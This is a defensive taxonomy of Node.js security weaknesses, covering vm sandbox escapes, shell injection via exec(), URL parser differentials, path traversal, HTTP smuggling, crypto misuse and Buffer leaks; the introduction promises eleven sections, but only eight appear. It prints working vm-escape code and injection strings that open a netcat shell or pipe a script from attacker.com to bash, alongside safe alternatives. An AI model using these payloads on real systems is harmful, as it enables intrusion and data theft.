# Node.js Runtime Security — Mutation/Variation Taxonomy

---

## Classification Structure

Node.js is a server-side JavaScript runtime built on V8 with an event-driven, non-blocking I/O model. Its founding design principle — "make server-side JavaScript as easy as client-side JavaScript" — systematically creates security gaps across every core module. Defaults optimize for developer convenience over safety, deprecated insecure APIs persist indefinitely for backward compatibility, and the developer must opt into security rather than opt out of danger. The single-threaded event loop, the implicit full-trust module system, and the npm supply chain compound these structural issues into an attack surface far larger than any single vulnerability class.

This taxonomy organizes the complete Node.js security surface under **Axis 1: Mutation Target** — the structural component being attacked. Eleven top-level categories correspond to the principal attack surfaces: sandbox escape, command execution, URL parsing, path traversal, file system, HTTP protocol, cryptography, memory, module/supply chain, event loop, and the permission model.

**Axis 2: Design Pattern** provides the cross-cutting explanation for *why* each mutation works. The following meta-patterns recur throughout the taxonomy:

| Design Pattern | Code | Description |
|---|---|---|
| **Convenience-over-Safety Default** | P1 | Default behavior optimizes for developer experience, not security. Secure alternative exists but requires explicit opt-in. |
| **Backward Compatibility Tax** | P2 | Insecure API or behavior maintained indefinitely to avoid breaking the npm ecosystem. Deprecation warnings do not prevent usage. |
| **Abstraction Opacity** | P3 | API hides security-critical decisions from the developer. A single option flag or implicit behavior silently changes the security posture. |
| **Parser/Semantic Differential** | P4 | Coexisting components (legacy vs WHATWG URL, llhttp vs nginx) interpret the same input differently, creating bypass vectors. |
| **Implicit Full Trust** | P5 | No capability boundary between modules, dependencies, or components. Every `require()`'d package has identical privileges to the main process. |
| **Naming/Documentation Mismatch** | P6 | API name or parameter name implies safety guarantees that do not exist (`createContext`, `sandbox`, `path.join`). |

**Axis 3: Attack Scenario** maps mutations to real-world impact: Sandbox Escape, Remote Code Execution (RCE), Command Injection, Server-Side Request Forgery (SSRF), Path Traversal, Information Disclosure, HTTP Request Smuggling, Denial of Service (DoS), Cryptographic Weakness, Privilege Escalation, Supply Chain Compromise, and Prototype Pollution.

---

## §1. VM Module — Sandbox Illusion

The Node.js `vm` module wraps V8's `ContextifyScript` to compile and execute JavaScript in separate V8 "contexts." A V8 context provides heap-level separation — a distinct set of built-in objects (`Object`, `Array`, `Function`) — but shares the same V8 isolate (and therefore the same memory space, prototype chains, and native bindings) as the host context. The module documentation explicitly states: *"The `vm` module is not a security mechanism. Do not use it to run untrusted code."* Despite this, the API naming (`createContext`, `sandbox` parameter) strongly implies isolation, and the module is widely misused as a sandboxing mechanism.

**Source**: `lib/vm.js` — `class Script`, `createContext()`, `runInNewContext()`, `runInThisContext()`

### §1-1. Prototype Chain Traversal Escape

Every object in the sandbox inherits from the host context's `Object.prototype` via `this.constructor`. The `Function` constructor (`constructor.constructor`) creates functions that execute in the host context, providing access to `process`, `require`, and the entire Node.js API.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Basic constructor chain** | `this.constructor.constructor('return process')()` traverses sandbox → Object → Function → host scope | Any `vm.runInNewContext()` call; no mitigating configuration exists within the `vm` module |
| **Exception chain escape** | `try { null[0] } catch(e) { e.constructor.constructor('return process')() }` — error objects originate from the host context | Sandbox code can trigger any exception |
| **Proxy/getter escape** | `new Proxy({}, { get: (t,p) => t.constructor.constructor('return process')() })` — Proxy handlers execute in host context | V8 Proxy support (all modern versions) |
| **Symbol.toPrimitive escape** | Object with `[Symbol.toPrimitive]` returning host process via constructor chain, triggered by type coercion (`obj + ''`) | Any implicit type conversion in host code consuming sandbox values |
| **arguments.callee.caller** | In non-strict mode, `arguments.callee.caller` walks the call stack into host code, accessing host `Function` | Non-strict mode; older V8 versions |

```javascript
const vm = require('vm');
const sandbox = {};
vm.createContext(sandbox);

// Escape → RCE in a single expression
const result = vm.runInNewContext(
  `this.constructor.constructor('return process')()
    .mainModule.require('child_process')
    .execSync('id').toString()`,
  sandbox
);
// Returns: "uid=0(root) gid=0(root) ..."
```

**Root cause**: `createContext()` does not sever the prototype chain between the sandbox global object and host context built-in prototypes. V8 contexts share `Object.prototype` unless explicitly frozen or replaced — and even freezing is insufficient because the sandbox's own `this.constructor` property bridges back.

### §1-2. Shared Object Bridge Escape

Any host object placed into the sandbox context provides a prototype chain bridge back to the host.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Console/utility injection** | `sandbox.log = console.log` — `log.constructor` is host `Function` | Developer passes host utilities for debugging convenience |
| **Options object pollution** | Host object passed as sandbox property; sandbox code modifies `__proto__` to pollute host `Object.prototype` | Any shared object reference |
| **Callback bridge** | Host function passed as callback; sandbox calls `callback.constructor('return process')()` | Pattern of passing host callbacks into sandbox |

```javascript
const sandbox = { log: console.log };
vm.createContext(sandbox);
vm.runInNewContext(
  `log.constructor('return this')().process.exit()`,
  sandbox
);
```

### §1-3. Default Configuration Security Implications

| Option | Default | Security Implication |
|---|---|---|
| `timeout` | None (infinite) | Sandbox code runs indefinitely — CPU DoS |
| `breakOnSigint` | `false` | Cannot interrupt runaway sandbox code with Ctrl+C |
| `microtaskMode` | `undefined` | Microtasks from sandbox run in host's microtask queue |
| `contextCodeGeneration.strings` | `true` | `eval()` works inside sandbox — unnecessary and dangerous capability |
| `contextCodeGeneration.wasm` | `true` | WebAssembly compilation permitted inside sandbox |

### §1-4. The vm2 Saga — Proof of Unsandboxability

The `vm2` package was a widely used attempt to create a secure sandbox on top of `vm`. It used Proxy-based interception, prototype chain hardening, and compiler transformations. All were defeated:

| CVE | Year | CVSS | Escape Mechanism |
|---|---|---|---|
| CVE-2023-29199 | 2023 | 10.0 | Exception sanitization bypass |
| CVE-2023-32314 | 2023 | 10.0 | Proxy handler manipulation |
| CVE-2023-37466 | 2023 | 9.8 | Promise job queue manipulation |
| CVE-2023-37903 | 2023 | 9.8 | Custom `inspect` function on host objects |

The maintainer archived the project in August 2023, concluding that JavaScript cannot be securely sandboxed within a single V8 isolate.

**Architecturally sound alternatives**:

| Solution | Mechanism | Isolation Level |
|---|---|---|
| `isolated-vm` | Separate V8 isolate (separate heap, no shared prototypes) | Strong within process |
| SES (Secure ECMAScript) | Hardened JavaScript compartments (Agoric) | Moderate (same isolate, hardened) |
| Worker threads + Permission Model | Separate thread + `--permission` flags | Moderate |
| Separate process with seccomp/landlock | OS-level syscall filtering | Strong |
| Container (Docker/gVisor) | OS-level namespace isolation | Very strong |

---

## §2. Child Process — Shell-by-Default Command Execution

The `child_process` module provides multiple APIs for spawning subprocesses with fundamentally different security properties. The critical design flaw is that `exec()` — the most intuitive, most commonly taught, and most commonly used function — forces all commands through a system shell by default, making every shell metacharacter in user input an injection vector.

**Source**: `lib/child_process.js` — `normalizeExecArgs()`, `normalizeSpawnArguments()`

### §2-1. Shell String Injection via exec()

`exec()` passes the entire command string to `/bin/sh -c` (Unix) or `cmd.exe /c` (Windows). Every shell metacharacter is interpreted.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Semicolon chaining** | `userInput = "example.com; cat /etc/passwd"` — semicolon terminates the intended command and starts attacker's command | Any user input concatenated into `exec()` command string |
| **Pipe injection** | `userInput = "x | nc attacker.com 4444 -e /bin/sh"` — pipe redirects output to attacker's netcat listener | Input reaches `exec()` without metacharacter filtering |
| **Command substitution** | `userInput = "$(curl attacker.com/shell.sh\|bash)"` or backtick equivalent — shell evaluates the nested command | Backtick or `$()` not filtered |
| **Background execution** | `userInput = "x & curl attacker.com/exfil?data=$(cat /etc/passwd)"` — ampersand backgrounds first command, runs second | Ampersand not filtered |
| **Newline injection** | `userInput = "x\nwhoami"` — newline acts as command separator in shell | URL-decoded `%0a` bypasses string-level checks |

```javascript
// lib/child_process.js — exec() ALWAYS sets shell=true
function normalizeExecArgs(command, options, callback) {
  // ...
  options.shell = typeof options.shell === 'string' ? options.shell : true;
  // ^^ This is WHY exec() is fundamentally insecure
  return { file: command, options, callback };
}
```

```javascript
// VULNERABLE: The most commonly taught pattern
const { exec } = require('child_process');
app.get('/lookup', (req, res) => {
  exec(`nslookup ${req.query.domain}`, (err, stdout) => {
    res.send(stdout);
  });
});
// Attack: ?domain=example.com;cat /etc/passwd

// SAFE: execFile with argument arrays, no shell
const { execFile } = require('child_process');
execFile('nslookup', [req.query.domain], (err, stdout) => {
  res.send(stdout);
});
```

### §2-2. Silent Shell Degradation via spawn() Options

Setting `shell: true` on `spawn()` or `execFile()` silently converts safe argument arrays back into an unsafe shell string. The developer believes argument arrays prevent injection, but a single option flag removes that protection.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Explicit shell:true** | `spawn('grep', ['-r', userInput, '/var/log'], { shell: true })` — args recombined into shell string `grep -r <userInput> /var/log` | Developer sets `shell: true` (often copied from Stack Overflow) |
| **Inherited shell option** | Options object from user input or config contains `shell: true` via prototype pollution or misconfiguration | Options object not hardcoded |
| **Environment variable injection** | `spawn()` inherits `process.env` by default — includes `NODE_OPTIONS`, `PATH`, `LD_PRELOAD`, AWS credentials | `options.env` not explicitly set |

```javascript
// lib/child_process.js — spawn() with shell option
function normalizeSpawnArguments(file, args, options) {
  if (options.shell) {
    // Arguments are recombined into a single string
    const command = [file, ...args].join(' ');
    file = typeof options.shell === 'string' ? options.shell : '/bin/sh';
    args = ['-c', command];
    // ^^ ALL argument-array safety is LOST
  }
}
```

### §2-3. Windows-Specific Amplification

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Batch file implicit shell** | `.bat` and `.cmd` files ALWAYS execute via `cmd.exe` even with `shell: false`, enabling `cmd.exe` metacharacter injection in arguments | Windows; `execFile()` or `spawn()` targeting a `.bat`/`.cmd` file (CVE-2024-27980) |
| **PATHEXT hijacking** | Without file extension, Windows searches `PATHEXT` (`.COM;.EXE;.BAT;.CMD;.VBS;.JS`). Attacker places `.bat` earlier in `PATH` | Windows; command specified without extension |
| **cmd.exe quoting inconsistency** | Windows lacks a single argument quoting convention; Node.js attempts quoting for `cmd.exe` but edge cases remain | Windows; arguments containing `^`, `&`, `\|`, `<`, `>` |

### §2-4. Error Handling Information Leakage

```javascript
exec(`ls ${userInput}`, (error, stdout, stderr) => {
  if (error) {
    // error.cmd = 'ls <full user input with shell expansion>'
    // error.stderr = system error message with paths, usernames
    res.status(500).json({ error: error.message });
    // LEAKS: command structure, system paths, username patterns
  }
});
```

---

## §3. URL Parsing — Dual Parser Differential

Node.js maintains two fundamentally different URL parsers with incompatible behaviors. The legacy `url.parse()` (deprecated since Node 11, widely used throughout the npm ecosystem) and the WHATWG `URL` class (`new URL()`) disagree on backslash handling, authority extraction, IPv6 parsing, tab/newline stripping, and protocol-relative URLs. Applications that validate URLs with one parser and make requests with the other are vulnerable to SSRF and open redirect through parser confusion.

**Source**: `lib/url.js` (legacy), `lib/internal/url.js` (WHATWG/ada)

### §3-1. Backslash Authority Confusion

The most exploited differential. WHATWG treats backslash as a path separator in "special" schemes (http, https, ftp), while legacy `url.parse()` does not.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Backslash authority termination** | `http://evil.com\@trusted.com/` — WHATWG sees hostname `evil.com` (backslash terminates authority); legacy sees hostname `trusted.com` (backslash not a separator) | Validation with one parser, fetch with the other |
| **Mixed parser SSRF** | Application validates `url.parse(input).hostname === 'api.internal.com'`, then `fetch(input)` uses WHATWG parser — hostname mismatch allows connecting to attacker-controlled host | Legacy parser used for allowlist check, WHATWG-based HTTP client for actual request |

```javascript
const url = require('url');

// Legacy parser
url.parse('http://evil.com\\@trusted.com/').hostname;
// → 'trusted.com' (backslash is NOT a separator)

// WHATWG parser
new URL('http://evil.com\\@trusted.com/').hostname;
// → 'evil.com' (backslash IS a separator in special schemes)

// SSRF: Validation passes, fetch goes to attacker
const parsed = url.parse(userUrl);
if (parsed.hostname === 'trusted-api.com') {
  fetch(userUrl); // WHATWG parser → connects to evil.com
}
```

### §3-2. IPv6 and Hostname Edge Cases

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **IPv6 bracket inconsistency** | `new URL('http://[::1]/').hostname` returns `::1` or `[::1]` depending on version; `url.parse()` returns `::1` (no brackets). Blocklist checking for `::1` misses `[::1]` or vice versa | IP blocklist using string comparison against one parser's output |
| **Tab/newline stripping** | WHATWG strips tabs (`\t`) and newlines (`\n`, `\r`) from input: `http://exa\tmple.com/` → `example.com`. Legacy preserves them. WAF bypass via tabs in hostname | WHATWG parser resolves to blocked host after stripping characters the WAF doesn't strip |
| **Credentials-in-URL confusion** | `http://trusted.com@evil.com/` — different parsers disagree on which part is the hostname vs. userinfo | URL validation not accounting for userinfo@host syntax |

### §3-3. url.resolve() Open Redirect

The deprecated `url.resolve()` performs relative URL resolution with no scheme validation and no security awareness.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Protocol-relative redirect** | `url.resolve('http://example.com/', '//evil.com/')` → `http://evil.com/` — protocol-relative URL inherits scheme from base | User-controlled relative URL passed to `url.resolve()` |
| **Arbitrary scheme passthrough** | `url.resolve('http://example.com/', 'javascript:alert(1)')` → `javascript:alert(1)` — no scheme allowlist | Relative URL with dangerous scheme |
| **Path traversal in resolution** | `url.resolve('http://example.com/a/b/', '../../../etc/passwd')` → `http://example.com/etc/passwd` | Deep traversal in relative component |

### §3-4. Query String Parser Differential

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Duplicate key type confusion** | `querystring.parse('a=1&a=2')` → `{ a: ['1','2'] }` (array); `URLSearchParams.get('a')` → `'1'` (first value only). Code expecting a string receives an array, or vice versa | Application uses `if (param === 'admin')` — fails when param is an array |
| **HPP via querystring** | `querystring.parse('role=user&role=admin')` → `{ role: ['user', 'admin'] }`. If `.includes('admin')` check is used, authorization passes; if `=== 'admin'`, it fails | Inconsistent type handling across authorization checks |
| **Prototype pollution via qs** | Express with `extended: true` uses the `qs` package which supports nested object syntax: `role[__proto__][isAdmin]=true` | Express default middleware with `extended: true` |
| **`]=` separator priority trick** | `qs` searches for `]=` before `=` to split key from value. If `]=` appears anywhere in a value (e.g., `redirect_uri=javascript:alert(1)//?x]=x`), `qs` uses that `]=` as the split point, destroying the intended key. `URLSearchParams` always splits at the first `=`, so the two parsers extract completely different key-value pairs from the same query string | Server uses `qs` (Express `extended`) to validate a parameter; client-side JS re-parses from `window.location.search` via `URLSearchParams` and acts on the divergent result |
| **Bracket stripping differential** | `qs` treats `[redirect_uri]=value` identically to `redirect_uri=value` by stripping outer brackets during key parsing. `URLSearchParams` treats `[redirect_uri]` as a literal key distinct from `redirect_uri`. Attacker sends the safe value via `[redirect_uri]` (passes backend validation) while the malicious `redirect_uri` is only visible to the browser's `.get("redirect_uri")` | Server uses `qs`; client uses `URLSearchParams`; both read the same query string |
| **parameterLimit exhaustion** | `qs` default `parameterLimit` is 1000 — parameters beyond this index are silently dropped. `URLSearchParams` has no limit. Attacker pads 1000+ junk `&p` parameters before the malicious `redirect_uri`, hiding it from the server while the browser processes the entire query string | Express with default `qs` configuration; no server-side limit override; client-side JS reads from `window.location.search` |
| **Server-validate / client-reparse XSS** | Compound pattern: server validates a query parameter (e.g., `redirect_uri`) using `qs`, confirms it matches an allowlist, and renders a page where client-side JS re-parses from `window.location.search` via `URLSearchParams` and navigates to the result. Any of the above `qs`-vs-`URLSearchParams` differentials allows the server check to pass while the browser extracts a `javascript:` URI | Backend validation + client-side navigation using different query string parsers on the same raw URL |

---

## §4. Path Module — Traversal Non-Prevention

The `path` module is explicitly a string manipulation module, not a security module. It resolves `..` sequences, normalizes separators, and joins path components — but provides NO containment, sandboxing, or traversal prevention. Developers widely misunderstand `path.join()` as a safe path construction function.

**Source**: `lib/path.js` — `join()`, `resolve()`, `normalize()`

### §4-1. path.join() Traversal Resolution

`path.join()` concatenates and normalizes paths, resolving `..` traversal sequences instead of rejecting them. This is by design — and it is exactly the attack.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Direct traversal** | `path.join('/var/uploads/', '../../../etc/passwd')` → `/etc/passwd` — traversal sequences resolved, base directory escaped | Any user-controlled path component passed to `path.join()` |
| **Double-encoded traversal** | Application URL-decodes input, passes to `path.join()`. `%252e%252e%252f` → `%2e%2e%2f` (first decode) → `../` (second decode) | Double decoding before or after path operations |
| **URL-encoded bypass** | `path.join('/uploads/', '%2e%2e/%2e%2e/etc/passwd')` — `%2e%2e` is not `..` at the path level, but if later URL-decoded or if the filesystem interprets percent encoding, traversal occurs | Application-level decode after path check |

```javascript
// lib/path.js — posix.join() (simplified)
join(...args) {
  let joined;
  for (let i = 0; i < args.length; ++i) {
    if (joined === undefined) joined = args[i];
    else joined += `/${args[i]}`;
  }
  return posixNormalize(joined);
  // normalize() RESOLVES '..' — does NOT reject it
}
```

### §4-2. path.resolve() Absolute Path Override

If any argument to `path.resolve()` is an absolute path, all previous arguments are discarded. The base directory is silently ignored.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Absolute path injection** | `path.resolve('/var/uploads/', '/etc/passwd')` → `/etc/passwd` — base directory completely ignored | User input starts with `/` (Unix) or drive letter (Windows) |
| **Windows UNC path override** | `path.resolve('C:\\safe\\', '\\\\attacker\\share\\payload')` → `\\\\attacker\\share\\payload` | Windows; user input starts with `\\` |

### §4-3. Platform-Specific Path Complications

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Windows case insensitivity** | `C:\Windows` === `c:\windows` === `C:\WINDOWS` on NTFS. Path containment checks using `startsWith()` may fail if cases differ | Windows; string-based path comparison without normalization |
| **Windows drive-name path traversal** | `path.join()` on Windows may treat drive-name inputs as relative while the resolved path can refer to a drive root, escaping a restricted parent directory (CVE-2025-23084) | Windows; `path.join()` used for containment or permission checks without final resolved-path validation |
| **Windows 8.3 short names** | `PROGRA~1` = `Program Files`. Containment check against full name bypassed by short name alias | Windows NTFS; short name generation enabled |
| **Windows alternate data streams** | `file.txt::$DATA` accesses the default stream of `file.txt`. Can bypass extension checks (`file.php::$DATA` → served as PHP on some servers) | Windows NTFS; file extension validation |
| **Null byte injection** | `path.join('/uploads/', 'file.txt\x00.jpg')` — null byte survives through `path` module. Only caught by `fs` module at system call level | Pre-Node.js 8 or path operations not followed by `fs` calls |

### §4-4. Symlink Escape

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Symlink following after path check** | `path.resolve('/safe/', 'link/secret')` passes `startsWith('/safe/')` check, but `link → /etc` causes `fs.readFile` to read `/etc/secret` | Symlinks exist within the permitted directory |
| **TOCTOU symlink creation** | Path validated, then symlink created between validation and file operation, redirecting read/write to arbitrary location | Attacker has write access to the directory |

**Correct containment pattern**:
```javascript
function safePath(basedir, userInput) {
  const base = path.resolve(basedir);
  const target = path.resolve(basedir, userInput);
  if (!target.startsWith(base + path.sep) && target !== base) {
    throw new Error('Path traversal detected');
  }
  // Resolve symlinks and re-check
  const realTarget = fs.realpathSync(target);
  const realBase = fs.realpathSync(base);
  if (!realTarget.startsWith(realBase + path.sep) && realTarget !== realBase) {
    throw new Error('Symlink escape detected');
  }
  return realTarget;
}
```

---

## §5. File System Module — Implicit Full Access

The `fs` module provides direct OS filesystem access with minimal abstraction. By default it follows symbolic links, inherits the process's full permissions, provides no containment, and leaks detailed system information through error objects.

**Source**: `lib/fs.js`, `lib/internal/fs/utils.js`

### §5-1. Default Symlink Following

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **readFile follows symlinks** | `fs.readFile('/safe/uploads/link')` follows `link → /etc/passwd` transparently. No `O_NOFOLLOW` flag is set. | Symlink exists at any point in the path |
| **TOCTOU between lstat and readFile** | Developer checks `fs.lstat()` (symlink detection), then calls `fs.readFile()`. Between the two calls, a symlink can be created | Attacker has write access to directory; async code with yield points |
| **writeFile via symlink** | `fs.writeFile('/safe/uploads/link', payload)` follows symlink to overwrite arbitrary file (e.g., `link → /etc/cron.d/malicious`) | Write access + symlink creation |

### §5-2. TOCTOU Race Conditions

The `fs` module's asynchronous API naturally creates Time-of-Check-Time-of-Use windows.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **access() then readFile()** | `fs.access()` confirms readability; between check and `fs.readFile()`, the file is replaced with a symlink to `/etc/shadow` | Concurrent attacker with directory write access |
| **stat() then open()** | `fs.stat()` verifies file size/type; file changes between stat and open | Multi-request race window |
| **mkdir then write** | Permission check on directory, then `fs.writeFile()`. Directory contents can change between check and write | Shared directory with multiple writers |

### §5-3. Error Object Information Disclosure

```javascript
fs.readFile('/etc/shadow', (err) => {
  res.status(500).json(err);
  // Client receives:
  //   errno: -13
  //   code: 'EACCES'
  //   syscall: 'open'
  //   path: '/etc/shadow'    ← Full filesystem path leaked
  //   message: "EACCES: permission denied, open '/etc/shadow'"
  // Reveals: file exists, path structure, syscall attempted, permission model
});
```

### §5-4. File Open Flags

| Flag | Behavior | Security Use |
|---|---|---|
| `'r'` | Read only | Default — follows symlinks |
| `'w'` | Write, create, truncate | Overwrites existing files including through symlinks |
| `'wx'` | Write exclusive (`O_EXCL`) | **Safe for new files**: fails if file exists, prevents symlink overwrite |
| `'ax'` | Append exclusive | **Safe for new files**: fails if file exists |

---

## §6. HTTP Protocol — Parser Differentials and DoS Defaults

Node.js uses `llhttp` (TypeScript-generated HTTP parser) for HTTP/1.1 and `nghttp2` for HTTP/2. The parser transition from the older `http_parser` introduced new parsing behaviors that differ from common reverse proxies, creating request smuggling windows. Default server configuration provides minimal DoS protection.

**Source**: `lib/_http_server.js`, `lib/_http_common.js`

### §6-1. HTTP Server DoS-Enabling Defaults

| Default | Value | Security Implication |
|---|---|---|
| `server.timeout` | `0` (no timeout, since Node 13) | Slowloris attacks: client sends data very slowly, holds connection indefinitely |
| `server.headersTimeout` | `60000` (60 seconds) | Slow header attacks have a full 60-second window |
| `server.requestTimeout` | `300000` (5 minutes, since Node 18) | Slow request body attacks have 5 minutes |
| `server.keepAliveTimeout` | `5000` (5 seconds) | Reasonable |
| `server.maxHeadersCount` | `2000` | Up to 2000 headers accepted per request |
| `--max-http-header-size` | `16384` (16KB) | Maximum header size; set lower for tighter control |
| No request body size limit | Unlimited | Must be set by application or framework (e.g., `express.json({ limit: '256kb' })`) |
| No rate limiting | None | Must be added via middleware |
| No security headers | None | No CSP, HSTS, X-Content-Type-Options, X-Frame-Options by default |

**Version-specific regression**: In Node.js 13, `server.timeout` was changed from `120000` (2 minutes) to `0` (no timeout). This silently removed DoS protection from all servers relying on the default.

### §6-2. HTTP Request Smuggling via llhttp

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **CL.TE desynchronization** | Front-end uses Content-Length, Node.js uses Transfer-Encoding. Front-end forwards too much data; Node.js treats the excess as a new request | Both headers present; front-end doesn't strip Content-Length when TE is present |
| **TE.CL desynchronization** | Front-end uses Transfer-Encoding, Node.js uses Content-Length. Front-end forwards until chunk terminator; leftover data becomes a new request for Node.js | Obfuscated TE header accepted by one side |
| **TE obfuscation** | `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked` (space before colon), `Transfer-Encoding:\tchunked` — accepted by one parser, rejected by the other | Parser leniency differences |
| **CRLF inconsistency** | Node.js strict mode rejects bare `\r` without `\n`; some proxies accept it. Bare `\r` in headers creates differential interpretation | CVE-2022-35256 |
| **Chunk extension abuse** | Malformed chunk extensions parsed differently by Node.js and upstream proxies | CVE-2024-22019 — unbounded memory growth from specially crafted chunked requests |

| CVE | Year | Severity | Root Cause |
|---|---|---|---|
| CVE-2024-22019 | 2024 | High | Chunk extension parsing — unbounded memory growth |
| CVE-2024-27982 | 2024 | Medium | Content-Length / Transfer-Encoding inconsistency |
| CVE-2022-32213 | 2022 | Medium | Improper Transfer-Encoding parsing in llhttp |
| CVE-2022-32214 | 2022 | Medium | Multi-line Transfer-Encoding headers not rejected |
| CVE-2022-32215 | 2022 | Medium | Improper chunked encoding boundary handling |
| CVE-2022-35256 | 2022 | Medium | Bare CR without LF accepted as line terminator |
| CVE-2019-15605 | 2019 | High | Malformed Transfer-Encoding headers — CL.TE desync |

### §6-3. insecureHTTPParser — The Smuggling Switch

The `insecureHTTPParser` option (server-level or per-connection) relaxes llhttp to accept malformed HTTP for backward compatibility. This dramatically increases the attack surface.

| Leniency When Enabled | Smuggling Vector |
|---|---|
| Spaces before header colon: `Content-Length : 42` | CL obfuscation — proxy sees header, strict parser doesn't (or vice versa) |
| Mixed Transfer-Encoding values | TE.TE attack with obfuscated TE variant |
| Invalid characters in header names/values | Header injection |
| Bare LF without CR | Line termination differential |

### §6-4. HTTP/2 Protocol Attacks

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Rapid Reset DoS** | Client opens and immediately cancels (RST_STREAM) massive numbers of HTTP/2 streams. Server performs substantial work per reset while freeing few resources | CVE-2023-44487 — cross-implementation vulnerability |
| **CONTINUATION flood** | Endless CONTINUATION frames without END_HEADERS flag cause unbounded memory growth for header accumulation | CVE-2024-27983 — High severity |
| **H2.CL smuggling** | HTTP/2 request contains Content-Length header that disagrees with the DATA frame length; when downgraded to HTTP/1.1 by a proxy, creates CL desynchronization | HTTP/2 to HTTP/1.1 downgrade path |

---

## §7. Cryptographic Module — Insecure Defaults Without Guardrails

Node.js's `crypto` module wraps OpenSSL, exposing its full breadth — including deprecated and insecure algorithms — without minimum strength requirements, algorithm warnings, or secure defaults at the API level.

**Source**: `lib/crypto.js`, `lib/internal/crypto/cipher.js`, `lib/internal/crypto/hash.js`

### §7-1. Deprecated Encryption — createCipher()

`crypto.createCipher()` (runtime-deprecated since Node 10 as DEP0106; moved to end-of-life and removed in Node.js 22.0.0) uses OpenSSL's `EVP_BytesToKey`: MD5-based key derivation, no salt, single iteration, deterministic IV. Legacy applications running on Node ≤ 21 LTS remain in scope.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **MD5 key derivation** | Key derived via single MD5 iteration from password — trivially brute-forceable | Any use of `createCipher()` |
| **No salt** | Deterministic derivation — same password always produces same key. Rainbow tables are precomputable | Any use of `createCipher()` |
| **Deterministic IV** | IV derived from same MD5 chain as key — identical plaintext always produces identical ciphertext | Any use of `createCipher()` |

**No runtime warning is emitted** when `createCipher()` is called. Deprecation is documentation-only.

### §7-2. Algorithm Permissiveness

| Unsafe (Available, No Warning) | Safe Alternative |
|---|---|
| `crypto.createHash('md5')` | `crypto.createHash('sha256')` or `sha3-256` |
| `crypto.createHash('md4')` | — |
| `crypto.createHash('sha1')` | `crypto.createHash('sha256')` |
| `crypto.createCipher('aes-128-ecb', pw)` | `crypto.createCipheriv('aes-256-gcm', key, iv)` |
| `crypto.pbkdf2(pw, salt, 1, 32, 'sha256', cb)` | Iterations ≥ 600,000 (OWASP 2023) |
| `crypto.generateKeyPairSync('rsa', { modulusLength: 512 })` | `modulusLength: 2048` minimum |

Node.js enforces **no minimum iteration count** for PBKDF2, **no minimum RSA key size**, and provides **no runtime warnings** for weak algorithms.

### §7-3. timingSafeEqual Length Leak

```javascript
function timingSafeEqual(a, b) {
  if (a.byteLength !== b.byteLength) {
    throw new ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH();
    // ^^ Length check is NOT timing-safe
    // Exception path is measurably faster than comparison path
    // Attacker learns the LENGTH of the secret
  }
  return _timingSafeEqual(a, b); // Constant-time content comparison
}

// SAFE: Hash both values first to ensure equal length
function verifyToken(userToken, secretToken) {
  const a = crypto.createHash('sha256').update(userToken).digest();
  const b = crypto.createHash('sha256').update(secretToken).digest();
  return crypto.timingSafeEqual(a, b); // Both 32 bytes — no length leak
}
```

### §7-4. Math.random() Misuse

`Math.random()` is not cryptographically secure but is frequently used for security-sensitive operations (session tokens, password reset codes, CSRF tokens). Node.js provides `crypto.randomBytes()`, `crypto.randomInt()`, and `crypto.randomUUID()` but does not warn about `Math.random()` misuse.

---

## §8. Buffer Module — Uninitialized Heap Exposure

The `Buffer` class exists because JavaScript historically lacked binary data manipulation. `Buffer.allocUnsafe()` returns memory from the V8 heap **without zeroing** — containing fragments of previous HTTP requests, TLS session keys, file contents, and internal V8 structures. The deprecated `Buffer()` constructor in old code paths did the same without the "Unsafe" naming warning.

**Source**: `lib/buffer.js`

### §8-1. allocUnsafe() Information Disclosure

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Direct heap exposure** | `Buffer.allocUnsafe(1024)` returns 1024 bytes of uninitialized heap data sent to client before filling | Buffer created and transmitted without overwriting all bytes |
| **Partial fill exposure** | `buf.write('Hello', 0)` fills bytes 0-4; bytes 5-1023 contain heap fragments | Buffer partially filled, then transmitted in full |
| **SlowBuffer exposure** | `new SlowBuffer(100)` (deprecated) — equivalent to `Buffer.allocUnsafeSlow(100)`, bypasses internal pool, allocates directly from V8 heap | Legacy code using deprecated API |

```javascript
// Attack scenario: Information disclosure
const buf = Buffer.allocUnsafe(4096);
// buf may contain: HTTP request bodies, TLS keys, file contents,
// JSON.parse() intermediates, password strings
socket.write(buf); // Leak to client
```

### §8-2. Buffer() Constructor Type Confusion

| Node.js Version | `Buffer(number)` Behavior | Risk |
|---|---|---|
| 0.x — 5.x | Returns UNINITIALIZED memory (like `allocUnsafe`) | Critical: heap memory exposure |
| 6.x — 9.x | Still returns UNINITIALIZED memory; deprecated in favor of `Buffer.alloc()`/`Buffer.allocUnsafe()`/`Buffer.from()` | Critical: deprecation warning but uninitialized memory persists |
| 10.x+ | `--zero-fill-buffers` flag available; newer versions progressively enforce safer defaults | Use `Buffer.alloc()` for zero-filled buffers |
| All versions | `Buffer(string)` creates buffer from string content | Type confusion if argument type is user-controlled |

```javascript
// If user controls argument type:
app.get('/data', (req, res) => {
  const buf = new Buffer(req.query.size); // number → heap leak (old Node)
  res.send(buf);
});
```

### §8-3. Encoding Handling Pitfalls

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Silent hex truncation** | `Buffer.from('abc', 'hex')` decodes only `'ab'` (one byte), silently drops trailing `'c'`. No warning. | Odd-length hex string; assumption of complete decoding |
| **Invalid hex silently empty** | `Buffer.from('xyz', 'hex')` returns empty Buffer — no error | Non-hex input; assumption of error on invalid data |
